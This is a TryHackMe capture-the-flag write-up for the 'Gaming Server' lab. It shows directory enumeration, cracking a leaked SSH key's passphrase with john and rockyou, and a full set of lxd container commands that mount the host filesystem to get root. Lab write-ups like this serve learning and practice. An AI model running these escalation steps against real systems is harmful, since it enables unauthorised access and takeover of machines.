TRYHACKME CFT - GAMING SERVER

WE connect to the ip address through tunneling 
Begin with scanning the ip address:- 
![Project Screenshot](1.png.png)


We can see tht 2 ports are open 
22 for ssh & 80 for the apache server

so then  figure  if something is there in the apache server:-

![Project Screenshot](1-1.png)

We inspected the view source page:-

![Project Screenshot](1-2.png)

ohh ....prolly the Name of the user be john 

try finding out any subdirectories this server has using gobuster:-

![Project Screenshot](3.png.png)

AFter trying to find subdirectories we got /secret

![Project Screenshot](2.png.png)

After checking over the file secret key , it gives a rsa key to the ssh 
We can copy the key and save it in some file 

sec.key 

which has to be converted into hash
using  ssh2john seckey > sec.hash 

and then 
try decrypting the sec.hash to find paraphrase

john sec.hash   --wordlist=/usr/share/wordlists/rockyou.txt

ones, done we need to give the file permission chmod 600


 
try login in into the ssh


![Project Screenshot](4.png.png)

yesss.. we entered the ssh

check for any user flag

![Project Screenshot](5.png.png)


Once,after getting the user flag lets try to get the root access:-


lets check the user id

![Project Screenshot](8.png)


we can see the user is a part of lxd/lxv user which is linux docker in the linux

we can get
the alpine script from the github

https://github.com/saghul/lxd-alpine-builder.git

and then install the tar.gx file from the builder and import it to the john's terminal through python http server.

Once thts done we can load the image and launch it.

lxc image import ./apline-v3.10-x86_64–20191008_1227.tar.gz — alias myimage

lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite


and then execute the /bin/sh to get root

lxc exec ignite /bin/sh


we get the root access to john.


locate the the file in the terminal

![Project Screenshot](7.png.png)


!!!!!! YESS WE GOT THE ROOT FILE.














